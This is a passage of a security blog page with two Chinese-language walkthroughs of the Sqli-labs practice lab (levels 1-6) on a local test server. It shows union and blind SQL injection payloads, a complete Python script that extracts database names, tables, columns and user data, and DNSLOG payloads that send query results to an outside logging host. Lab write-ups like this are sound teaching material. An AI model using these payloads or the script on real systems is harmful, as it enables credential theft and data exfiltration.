<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/uploads/xzpq.jpg?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta name="description" content="找回当年那个被寄予厚望的自己">
<meta property="og:type" content="website">
<meta property="og:title" content="P0rZ9&#39;s blog">
<meta property="og:url" content="http://yoursite.com/page/2/index.html">
<meta property="og:site_name" content="P0rZ9&#39;s blog">
<meta property="og:description" content="找回当年那个被寄予厚望的自己">
<meta property="og:locale" content="default">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="P0rZ9&#39;s blog">
<meta name="twitter:description" content="找回当年那个被寄予厚望的自己">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/page/2/"/>





  <title>P0rZ9's blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="default">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">P0rZ9's blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
            Archives
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/23/Sqli-labs_Blind_injection_Less5-6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/10/23/Sqli-labs_Blind_injection_Less5-6/" itemprop="url">Sqli-labs Blind injection Less5-6</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-23T08:15:41+08:00">
                2018-10-23
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>在Sqli-labs项目中的第5、6关是盲注部分。我们知道盲注中,往往会遇到截取字符串的问题,这种情况下往往需要一个一个字符的去猜解,这里就总结几个过程中会用于截取字符串的函数及在Less5、6中的应用。</p>
</blockquote>
<hr>
<p>##<strong>MID(源字符串,开始位置,截取长度)</strong><br>    str = ‘123456’  mid(str,2,1)结果为2 （下标从1开始）<br><strong>SQL用例</strong>：<br>A.<code>MID(DATABASE(),1,1)&gt;&#39;a&#39;</code>,查看数据库名第一位，<code>MID(DATABASE(),2,1)</code>查看数据库名第二位，依次查看各位字符。</p>
<p>B.<code>MID((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xx LIMIT 0,1),1,1)&gt;&#39;a&#39;</code>这里的源字符串可为sql语句,可自行构造进行注入</p>
<p>##<strong>substr(源字符串,开始位置,截取长度)</strong><br>substr与mid substring的用法类似<br>str = ‘123456’  substr(str,2,1)结果为2 （下标从1开始）<br><strong>SQL用例</strong>：<br>A.<code>substr(DATABASE(),1,1)&gt;&#39;a&#39;</code>,查看数据库名第一位,<code>MID(DATABASE(),2,1)</code>查看数据库名第二位,依次查看各位字符。</p>
<p>B.<code>substr((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xx LIMIT 0,1),1,1)&gt;&#39;a&#39;</code>这里的源字符串可为sql语句,可自行构造进行注入</p>
<p>##<strong>left(源字符串,截取长度)</strong><br>left得到字符串从左开始指定个数的字符串<br>str = ‘123456’  left(str,3) 结果为123<br><strong>SQL用例</strong>：<br>A.<code>left(database(),1)&gt;&#39;a&#39;</code>,查看数据库名第一位,<code>left(database(),2)&gt;&#39;ab&#39;</code>,查看数据库名前二位。</p>
<p>B.<code>left((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xx LIMIT 0,1),1)&gt;&#39;a&#39;</code>这里的源字符串可为sql语句,可自行构造进行注入</p>
<hr>
<p>再介绍一<code>下ascii()</code>与<code>ord()</code>函数,这两个函数经常与上面的截取函数连用。<br>因为mysql默认是不对大小写敏感的,所以为了保证结果准确,我们就需要将字符转为其对应的ascii码值进行比较</p>
<p>用法:<code>ASCII(str1) ord(str1)</code> 都是返回字符串的第一个字符的ASCII码值</p>
<p><strong>SQL用例</strong>：</p>
<pre><code>猜解数据库名第一位的ascii码值是否为97 (即字符a)
ascii(substr(database(),1,1))=97 
ord(mid(database(),1,1))=97  
</code></pre><p>##<strong>Less-5:</strong><br>经过简单查看页面,这里的正确界面并不会返回用户名与密码,而是返回字符串<code>You are in.....</code><br><img src="http://static.zybuluo.com/chhyx/q6l3mejmpny13ckm3zjr7sue/image_1cqdfvqp21pi71ehd1kou7gs1kgtam.png" alt="image_1cqdfvqp21pi71ehd1kou7gs1kgtam.png-206.3kB"></p>
<p>加单引号看报错信息:<br><img src="http://static.zybuluo.com/chhyx/1c8lqewwtouvcupqlga4at3v/image_1cqdfu64t2avelb1ugdlh61ssca9.png" alt="image_1cqdfu64t2avelb1ugdlh61ssca9.png-212.9kB"></p>
<p>我们可以看到我们提交的1’经过sql语句处理变成<code>&#39;&#39;1&#39;&#39; LIMIT 0,1</code> 所以我们可以猜测后台代码是这样写的:<code>$sql=&quot;select * from users where id=&#39;$id&#39; limit 0,1&quot;</code><br>这里我们就需要闭合掉单引号</p>
<pre><code>http://127.0.0.1:86/less-5/index.php?id=1&apos; and 1=1--+
http://127.0.0.1:86/less-5/index.php?id=1&apos; and 1=2--+
</code></pre><p>这里正确会返回You are in…… 错误返回空</p>
<p>那么基本可以确定这里是一处盲注了,下面笔者直接给出payload,如果有不熟悉的语句,可参考笔者之前的文章:<a href="https://p0rz9.github.io/2018/10/22/Sqli-labs_Less1-4/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/10/22/Sqli-labs_Less1-4/</a></p>
<p>猜解数据库长度:</p>
<pre><code>http://127.0.0.1:86/less-5/index.php?id=1&apos; and length(database())&gt;7--+
http://127.0.0.1:86/less-5/index.php?id=1&apos; and length(database())&gt;8--+
</code></pre><p>说明数据库长度为8</p>
<p>猜解数据库名:</p>
<pre><code>http://127.0.0.1:86/less-5/index.php?id=1&apos; and ascii(substr((database()),1,1))=115--+
</code></pre><p>这里用burp简单测试一下,发现<code>ascii码</code>值为115返回正确页面, 猜解出第一位为s<br><img src="http://static.zybuluo.com/chhyx/2887km8ounik96ogys2wymx9/image_1cqfqlru4kvm10nj4vh16sl17c19.png" alt="image_1cqfqlru4kvm10nj4vh16sl17c19.png-63.9kB"><br>改变<code>substr</code>的第二个参数,至到数据库名全部猜解。（security）</p>
<p>猜解数据表数量:</p>
<pre><code>&apos; and (select count(table_name) from information_schema.tables where table_schema=&apos;security&apos;)=4--+
</code></pre><p>得到security数据库共有4张表<br>猜解每个表的长度:</p>
<pre><code>&apos; and length((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1))=6--+
</code></pre><p>猜解数据表名:</p>
<pre><code>&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),1,1))=97--+
</code></pre><p>猜解列个数:</p>
<pre><code>&apos; and (select count(column_name) from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos;)=4--+
</code></pre><p>猜解列长度:(改变substr的第二个参数进行猜解)</p>
<pre><code>&apos; and ascii(substr((select column_name from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos; limit 0,1),1,1))--+
</code></pre><p>猜解列名:</p>
<pre><code>&apos; and ascii(substr((select column_name from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos; limit 0,1),1,1))=97--+
</code></pre><p>然后就是猜解列中的数据了(这里以username列为例)</p>
<p>猜解<code>username</code>列中的数据量:</p>
<pre><code>&apos; and (select count(username) from security.users)=13--+;
</code></pre><p>猜解<code>username</code>列第一条数据的长度:</p>
<pre><code>&apos; and ascii(substr((select username from security.users limit 0,1),1,1))--+
</code></pre><p>猜解<code>username</code>列第一条数据的长度</p>
<pre><code>&apos; and ascii(substr((select username name from security.users limit 0,1),1,1))=97--+
</code></pre><p>附完整python代码:</p>
<pre><code># -*- coding: utf-8 -*-
#author: P0rZ9
#env: python2 
#fun: Sqli-labs less5

import requests
import string

url = &quot;http://127.0.0.1:86/less-5/index.php?id=1&quot;
str1 = string.letters + string.digits + &quot;_!@#*&quot;

database_name = &quot;&quot;
table_num = 0
table_list = []
column_dic = {}
column_list = []
date_list = []

#猜解数据库长度
print &quot;开始猜解数据库长度......&quot;
for i in range(30):
    payload = &quot;&apos; and length(database())={}--+&quot;.format(str(i))
    re = requests.get(url+payload)
    #print url+payload
    if &apos;You are in...........&apos; in re.text and re.status_code == 200:
        database_length = i
        #print &apos;database_length:%d&apos;%(database_length)
        break
print &quot;数据库长度为%s&quot;%(database_length)
#database_length：8

#猜解数据库名
print &quot;开始猜解数据库名......&quot;
for i in range(1,database_length+1):
    for chr in str1:
        payload = &quot;&apos; and ascii(substr(database(),{},1))={}--+&quot;.format(str(i),ord(chr)) 
        re = requests.get(url+payload)
        #print url+payload
        if &apos;You are in...........&apos; in re.text and re.status_code == 200:
            database_name += chr
            break
        else:
            pass
print &quot;数据库名为%s&quot;%(database_name)
#database_name：security

#猜解数据表个数
print &quot;开始猜解表的数量......&quot;
for i in range(30):
    payload = &quot;&apos; and (select count(table_name) from information_schema.tables where table_schema=&apos;%s&apos;)=%s--+&quot;%(database_name,str(i))
    re = requests.get(url+payload)
    #print url+payload
    if &apos;You are in...........&apos; in re.text and re.status_code == 200:
        table_num = i
        break
    else:
        pass
print &quot;表的数量为:%s&quot;%(str(table_num))
#table_num:4


#表长度及名称
#表长
print &quot;开始猜解表名.......&quot;
for i in range(table_num):
    table_name = &quot;&quot;
    for j in range(10):
        payload = &quot;&apos; and length((select table_name from information_schema.tables where table_schema=&apos;%s&apos; limit %s,1))=%s--+&quot;%(database_name,str(i),str(j))
        re = requests.get(url+payload)
        #print url+payload
        if &apos;You are in...........&apos; in re.text and re.status_code == 200:
            table_len = j
            #print table_len

            #表名
            for k in range(table_len):#6
                for chr in str1:
                    payload = &quot;&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=&apos;%s&apos; limit %s,1),%s,1))=%s--+&quot;%(database_name,str(i),str(k+1),ord(chr))
                    #print url+payload
                    re = requests.get(url+payload)
                    if &apos;You are in...........&apos; in re.text and re.status_code == 200:
                        table_name += chr
                        break
            #print &quot;%s:%s位&quot;%(table_len,table_name)
            table_list.append(table_name)
            break
print table_list
#table_list = [&apos;uagents&apos;,&apos;referers&apos;,&apos;emails&apos;,&apos;users&apos;]


#字段

#猜解列的个数
print &quot;开始猜解%s的列个数&quot;%(table_list[-1])
for i in range(20):
    payload = &quot;&apos; and (select count(column_name) from information_schema.columns where table_schema=&apos;%s&apos; and table_name=&apos;%s&apos;)=%s--+&quot;%(database_name,table_list[-1],str(i))
    re = requests.get(url+payload)
    #print url+payload
    if &apos;You are in...........&apos; in re.text and re.status_code == 200:
        column_num = i
        #print &quot;%s:%s个表&quot;%(table_list[-1],column_num)
        column_dic.setdefault(table_list[-1],column_num)
        break

print &quot;%s的列个数为%s&quot;%(table_list[-1],column_dic[&apos;users&apos;])
#column_dic:{&apos;users&apos;: 3}



#猜解列的长度及列名
print &quot;开始猜解%s的列名......&quot;%(table_list[-1])

for i in range(column_dic[table_list[-1]]):#4
    column_name = &quot;&quot;
    for j in range(20):
        payload = &quot;&apos; and ascii(substr((select column_name from information_schema.columns where table_schema=&apos;%s&apos; and table_name=&apos;%s&apos; limit %s,1),%s,1))--+&quot;%(database_name,table_list[-1],str(i),str(j+1))
        #print url+payload
        re = requests.get(url+payload)

        if &apos;You are in&apos; not in re.text and re.status_code == 200:
            column_len = j
            #print column_len
            for k in range(column_len):
                for chr in str1:
                    payload = &quot;&apos; and ascii(substr((select column_name from information_schema.columns where table_schema=&apos;%s&apos; and table_name=&apos;%s&apos; limit %s,1),%s,1))=%s--+&quot;%(database_name,table_list[-1],str(i),str(k+1),ord(chr))
                    re = requests.get(url+payload)
                    #print url+payload
                    if &apos;You are in...........&apos; in re.text and re.status_code == 200:
                        column_name += chr
                        break

            print column_name
            column_list.append(column_name)
            break
print &quot;%s表有%s字段,分别为:%s&quot;%(table_list[-1],column_dic[table_list[-1]],column_list)
#column_list = [&apos;id&apos;,&apos;username&apos;,&apos;password&apos;]




print &quot;开始猜解%s表的数据量.......&quot;%(table_list[-1])
for i in range(20):
    payload = &quot;&apos; and (select count(%s) from %s)=%s--+;&quot;%(column_list[1],table_list[-1],str(i))
    re = requests.get(url+payload)
    #print url+payload
    if &apos;You are in...........&apos; in re.text and re.status_code == 200:
        data_num = i
        break
print &quot;得到%s表的数据量为%s组&quot;%(table_list[-1],str(data_num))
#data_num:13

print &quot;开始猜解%s表的%s列的数据.......&quot;%(table_list[-1],column_list[1])
for i in range(data_num):
    for j in range(20):
        date_name = &quot;&quot;
        payload = &quot;&apos; and ascii(substr((select %s from %s.%s limit %s,1),%s,1))--+&quot;%(column_list[1],database_name,table_list[-1],str(i),str(j+1))
        re = requests.get(url+payload)
        #print url+payload
        if &apos;You are in...........&apos; not in re.text and re.status_code == 200:

            for k in range(j):  #输入每个字符的长度
                for chr in str1:
                    payload = &quot;&apos; and ascii(substr((select %s name from %s.%s limit %s,1),%s,1))=%s--+&quot;%(column_list[1],database_name,table_list[-1],str(i),str(k+1),str(ord(chr)))
                    re = requests.get(url+payload)
                    #print url+payload
                    if &apos;You are in...........&apos; in re.text and re.status_code == 200:
                        date_name += chr
                        break
            date_list.append(date_name)
            break        
print &quot;%s表的%s列的数据:%s&quot;%(table_list[-1],column_list[1],date_list)
</code></pre><p>运行结果:<br><img src="http://static.zybuluo.com/chhyx/2n73z1533r7e7j9spwymv4tt/image_1cqfl19qe1eb21vb11nor1itstknp.png" alt="image_1cqfl19qe1eb21vb11nor1itstknp.png-101kB"></p>
<p>写这个脚本时主要是为了学习盲注,但是写完发现还有好多可改进的地方,比如没用函数包裹,猜解效率太低(可以考虑使用二分法)。有时间再改吧。</p>
<p>##<strong>Less-6:</strong><br>加单引号<code>&#39;</code>页面无明显返回:<br><img src="http://static.zybuluo.com/chhyx/742qe6uxv1qzc8q878jbizq2/image_1cqfsnokf112n1pokbbe1m6mn150.png" alt="image_1cqfsnokf112n1pokbbe1m6mn150.png-207.4kB"></p>
<p>加个双引号<code>&quot;</code>试试:<br><img src="http://static.zybuluo.com/chhyx/7833nzrji74ghcfxxqrck3qj/image_1cqfsl3oa1f15uin13p41gcd9j51j.png" alt="image_1cqfsl3oa1f15uin13p41gcd9j51j.png-214.6kB"></p>
<p>我们输入的1”变成了’”1”” limit 0,1’ 可发现多了一个双引号 我们注释掉它继续猜解。且我们可猜测后台处理语句为:</p>
<pre><code>$sql=&quot;SELECT * FROM users WHERE id=&quot;$id&quot; LIMIT 0,1&quot;;
</code></pre><p>那我们将Less-5所用payload中的<code>&#39;</code>改为<code>&quot;</code>即可成功利用。</p>
<p><img src="http://static.zybuluo.com/chhyx/z4iksin5ba3qjblj36bd7srh/image_1cqftpsuureu1uh18071tcl1djp9e.png" alt="image_1cqftpsuureu1uh18071tcl1djp9e.png-54.9kB"></p>
<p><strong>DNSLOG注入</strong><br>当然这里也可以使用DNSLOG来盲注,不清楚的可以先看看笔者前几天的文章:<br><a href="https://p0rz9.github.io/2018/09/26/%E5%88%A9%E7%94%A8DNSLOG%E5%BF%AB%E9%80%9F%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%28%E7%9B%B2%E6%B3%A8%29/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/26/利用DNSLOG快速获取数据(盲注)</a></p>
<p>获取数据库名:</p>
<pre><code>id=1&apos; and if((select load_file(concat(&apos;\\\\&apos;,(select database()),&apos;.xxxxx.ceye.io\\abc&apos;))),1,0)--+
</code></pre><p>即可在我们的dns平台查看数据库内容:<br><img src="http://static.zybuluo.com/chhyx/6pxiwvjna84pwnrocve6aj8j/image_1cqg1ucob1k9jmbe1emh1iml1nqo9.png" alt="image_1cqg1ucob1k9jmbe1emh1iml1nqo9.png-46.2kB"></p>
<p>获取表名：</p>
<pre><code>&apos; and if((select load_file(concat(&apos;\\\\&apos;,(select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),&apos;.xxxxx.ceye.io\\abc&apos;))),1,0)--+
</code></pre><p><img src="http://static.zybuluo.com/chhyx/1hf0mvtjsayzma47kbr7zuo3/image_1cqg2dqhh1gbj1rpm26q1arr16dm16.png" alt="image_1cqg2dqhh1gbj1rpm26q1arr16dm16.png-99.1kB"></p>
<p>之后更换我们的SQL语句即可获取数据。这种方式的优点是获取数据快,但是利用的条件相对来说较苛刻。不过在平常的测试中作为一种测试手法还是可以的。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/22/Sqli-labs_Less1-4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/10/22/Sqli-labs_Less1-4/" itemprop="url">Sqli-labs Error Based Sqli Less1-4</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-22T08:15:41+08:00">
                2018-10-22
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>项目下载地址:<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a><br>基础部分请参考笔者以前的文章:<br><a href="https://p0rz9.github.io/2018/10/15/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/10/15/SQL注入基础/</a><br><a href="https://p0rz9.github.io/2018/10/12/mysql%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/10/12/mysql基础命令/</a></p>
<p><strong>Less-1:</strong></p>
<p>通过更换id观察,可发现程序会通过遍历id获取对应的<code>name</code>与<code>password</code>:<br><img src="http://static.zybuluo.com/chhyx/kwee90sb6uk38mne895liw0u/image_1cqcvjah013o172f1qq9ncld61m.png" alt="image_1cqcvjah013o172f1qq9ncld61m.png-34.3kB"><br><img src="http://static.zybuluo.com/chhyx/19yl78kf7inas5m645h5tbp3/image_1cqcvk5631ij017br11471qk127s13.png" alt="image_1cqcvk5631ij017br11471qk127s13.png-35.5kB"></p>
<p>加<code>&#39;</code>查看报错信息:<br><img src="http://static.zybuluo.com/chhyx/ycj2g4ihotcyr7osq3th27ds/image_1cqd1hmpqpgf1035av8s83rat51.png" alt="image_1cqd1hmpqpgf1035av8s83rat51.png-35.5kB"></p>
<p>在上述的错误信息中,我们可以看到我们输入的1’在经过sql语句拼接后构成了 <code>&#39;1&#39;&#39; limit 0,1</code> 多加了一个<code>&#39;</code>,那我们可以利用在输入语句最后加注释(–+)的方法将他注释掉。</p>
<p>查看字段:</p>
<pre><code>http://127.0.0.1:86/less-1/index.php?id=1&apos; order by 3--+ 正确
http://127.0.0.1:86/less-1/index.php?id=1&apos; order by 4--+ 错误
</code></pre><p>说明字段为3,因为<code>order by 3</code> 表示用查询字段中的第3个字段进行排序,而<code>order by 4</code>报错说明不存在第4个字段,表明该表一共具有3个字段。</p>
<p>判断显示位:</p>
<pre><code>http://127.0.0.1:86/less-1/index.php?id=-1&apos; union select 1,2,3--+ 
</code></pre><p><img src="http://static.zybuluo.com/chhyx/mem0kwpifpbgx05yeq5s6z7b/image_1cqd00bpc10g5ttl4cb1b58qrh20.png" alt="image_1cqd00bpc10g5ttl4cb1b58qrh20.png-33.9kB"></p>
<p>使用union时,必须使前面的sql语句查询出错(不存在id=-1的用户),因为只有前面的sql语句结果为空就会显示我们自己构造的SQL语句 即<code>select 1,2,3</code></p>
<p>爆数据库名(将显示位替换为mysql的信息函数):<br><img src="http://static.zybuluo.com/chhyx/a5shqxuf55lzhsk6s2u1ehwl/image_1cqd07827jru1fnj1mll1slr1s7i2d.png" alt="image_1cqd07827jru1fnj1mll1slr1s7i2d.png-35.7kB"></p>
<p>表明当前使用的数据库名为<code>security</code> 用户为<code>root@localhost</code></p>
<p>爆<code>security</code>数据库的所有表名:</p>
<pre><code>http://127.0.0.1:86/less-1/index.php?id=-1&apos; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;),3--+ 
</code></pre><p><img src="http://static.zybuluo.com/chhyx/4mdwydzoarb2e96xaerxuur0/image_1cqd0h3gn1gj513qqqh6rhi8lf2q.png" alt="image_1cqd0h3gn1gj513qqqh6rhi8lf2q.png-53.4kB"></p>
<p>爆<code>users</code>表下的所有字段名:</p>
<pre><code>http://127.0.0.1:86/less-1/index.php?id=-1&apos; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos;),3--+ 
</code></pre><p><img src="http://static.zybuluo.com/chhyx/w0hpd6qqop1tqytcw5tr6ntn/image_1cqd0ld8t1dh3ebeeeeeihh5l47.png" alt="image_1cqd0ld8t1dh3ebeeeeeihh5l47.png-46.6kB"></p>
<p>获取<code>username</code>与<code>password</code>内容:</p>
<pre><code>http://127.0.0.1:86/less-1/index.php?id=-1&apos; union select 1,(select group_concat(username,&apos;:&apos;,password) from security.users),3--+ 
</code></pre><p><img src="http://static.zybuluo.com/chhyx/ond8909uzodpo0f40r9dujth/image_1cqd0q9aj1qbosesl631n8s1u74k.png" alt="image_1cqd0q9aj1qbosesl631n8s1u74k.png-62.1kB"></p>
<p><code>Less-1</code>源码:</p>
<pre><code>&lt;?php
//including the Mysql connect parameters.
include(&quot;../sql-connections/sql-connect.php&quot;);
error_reporting(0);
// take the variables 
if(isset($_GET[&apos;id&apos;]))
{
$id=$_GET[&apos;id&apos;];
//logging the connection parameters to a file for analysis.
$fp=fopen(&apos;result.txt&apos;,&apos;a&apos;);
fwrite($fp,&apos;ID:&apos;.$id.&quot;\n&quot;);
fclose($fp);

// connectivity 

$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

    if($row)
    {
      echo &quot;&lt;font size=&apos;5&apos; color= &apos;#99FF00&apos;&gt;&quot;;
      echo &apos;Your Login name:&apos;. $row[&apos;username&apos;];
      echo &quot;&lt;br&gt;&quot;;
      echo &apos;Your Password:&apos; .$row[&apos;password&apos;];
      echo &quot;&lt;/font&gt;&quot;;
      }
    else 
    {
    echo &apos;&lt;font color= &quot;#FFFF00&quot;&gt;&apos;;
    print_r(mysql_error());
    echo &quot;&lt;/font&gt;&quot;;  
    }
}
    else { echo &quot;Please input the ID as parameter with numeric value&quot;;}

?&gt;
</code></pre><p><code>Less1-Less4</code>都可利用上述<code>union</code>操作进行注入,下面就不再追溯了。</p>
<p><strong>Less-2:</strong></p>
<p>查看报错信息:<br><img src="http://static.zybuluo.com/chhyx/fqi5jyne11u1ehliyzs0ry7l/image_1cqd1lh8q1d1v76030n10ub9kc5u.png" alt="image_1cqd1lh8q1d1v76030n10ub9kc5u.png-45.2kB"><br>因为报错信息是在<code>limit 0,1</code>附近,猜测后台查询语句为:<code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1</code>对id无处理 直接查询。</p>
<p>查看字段:</p>
<pre><code>http://127.0.0.1:86/less-2/index.php?id=1 order by 3--+
http://127.0.0.1:86/less-2/index.php?id=1 order by 4--+
</code></pre><p>判断显示位:</p>
<pre><code>http://127.0.0.1:86/less-2/index.php?id=-1 union select 1,2,3--+
</code></pre><p>之后与<code>Less-1</code>一样 将显示位替换为查询语句即可。</p>
<p><code>Less-2</code>源码,只列出sql语句部分 剩下的与<code>Less-1</code>相同:</p>
<pre><code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;
</code></pre><p><strong>Less-3:</strong></p>
<p>报错信息:<br><img src="http://static.zybuluo.com/chhyx/un3nxsfayp67s4breg7c3cl0/image_1cqd1rn40qsg17jj1qre1bq812129q.png" alt="image_1cqd1rn40qsg17jj1qre1bq812129q.png-209.5kB"><br>根据报错信息 这里就需要闭合下单引号与括号了</p>
<p>查看字段:</p>
<pre><code>http://127.0.0.1:86/less-3/index.php?id=1&apos;) order by 3--+
http://127.0.0.1:86/less-3/index.php?id=1&apos;) order by 4--+
</code></pre><p>判断显示位:</p>
<pre><code>http://127.0.0.1:86/less-3/index.php?id=-1&apos;) union select 1,2,3--+
</code></pre><p>之后与<code>Less-1</code>一样 将显示位替换为查询语句即可。</p>
<p><code>Less-3</code>源码,只列出sql语句部分 剩下的与<code>Less-1</code>相同:</p>
<pre><code>$sql=&quot;SELECT * FROM users WHERE id=(&apos;$id&apos;) LIMIT 0,1&quot;;
</code></pre><p><strong>Less-4:</strong></p>
<p>输入单引号发现不报错:<br><img src="http://static.zybuluo.com/chhyx/mmkfe12lisrvwpd525f6er0o/image_1cqd22cokoj87a31vuspo25a0an.png" alt="image_1cqd22cokoj87a31vuspo25a0an.png-60.6kB"></p>
<p>再次测试双引号 成功报错:<br><img src="http://static.zybuluo.com/chhyx/iz7bh878j9fsrtxt1q7zpq9t/image_1cqd23l5j1lhi7jai3q126a5lsb4.png" alt="image_1cqd23l5j1lhi7jai3q126a5lsb4.png-209.2kB"></p>
<p>所以这里需要闭合双引号与括号</p>
<p>查看字段:</p>
<pre><code>http://127.0.0.1:86/less-4/index.php?id=1&quot;) order by 3--+
http://127.0.0.1:86/less-4/index.php?id=1&quot;) order by 4--+
</code></pre><p>判断显示位:</p>
<pre><code>http://127.0.0.1:86/less-3/index.php?id=1&quot;) union select 1,2,3--+
</code></pre><p>之后与<code>Less-1</code>一样 将显示位替换为查询语句即可。</p>
<p><code>Less-4</code>源码,只列出sql语句部分,剩下的与<code>Less-1</code>相同:</p>
<pre><code>$sql=&quot;SELECT * FROM users WHERE id=(&apos;$id&apos;) LIMIT 0,1&quot;;
</code></pre>
          
        
      
    </div>
    
